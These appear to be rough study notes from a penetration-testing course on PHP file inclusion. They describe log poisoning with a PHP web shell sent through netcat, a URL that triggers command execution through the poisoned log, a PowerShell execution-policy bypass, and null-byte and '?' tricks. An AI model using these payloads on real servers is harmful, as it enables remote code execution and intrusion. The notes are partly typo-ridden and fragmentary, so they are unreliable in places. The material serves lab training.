allows to include a file ina pplications running code

LFI local file intrusion is from same server

remote from another server

coomonly found in PHP applications

The php.ini file on the Windows 10 lab machine can be found at
C:\xampp\php\php.ini. Before making any changes to this file, consider making a
backup.

## identifying File Inclusion Vulnerabilities
File inclusions can be discovered in the same way as directory traversals. We must locate
parameters we can manipulate and attempt to use them to load arbitrary files. However, a file
inclusion takes this one step further, as we attempt execute the contents of the file within the
application.URL instead of a local path

## Contaminating Log Files

One way we can try to inject code onto the server is through log file poisoning. Most application
servers will log all URLs that are requested. We can use this to our advantage by submitting a
request that includes PHP code. Once the request is logged, we can use the log file in our LFI
payload..

to print 
powershell -ExecutionPolicy Bypass -File clear_logs.ps1
```
kali@kali:~$ nc -nv 10.11.0.22 80
(UNKNOWN) [10.11.0.22] 80 (http) open
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
HTTP/1.1 400 Bad Request
```

C:\xampp\apache\logs\access.log or by using the XAMPP
Control Panel. if the script has been logged

http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig execute it using this



Older versions of PHP have a vulnerability in which a null byte 278 (%00) will
terminate any string. This trick can be used to bypass file extensions added
server-side and is useful for file inclusions because it prevents the file extension
from being considered as part of the string. In other words, if an application
reads in a parameter and appends “.php” to it, a null byte passed in the parameter
effectively ends the string without the “.php” extension. This gives an attacker
more flexibility in what files can be loaded with the file inclusion vulnerability.
Another trick for RFI payloads is to end them with a question mark (?) to mark
anything added to the URL server-side as part of the query string.
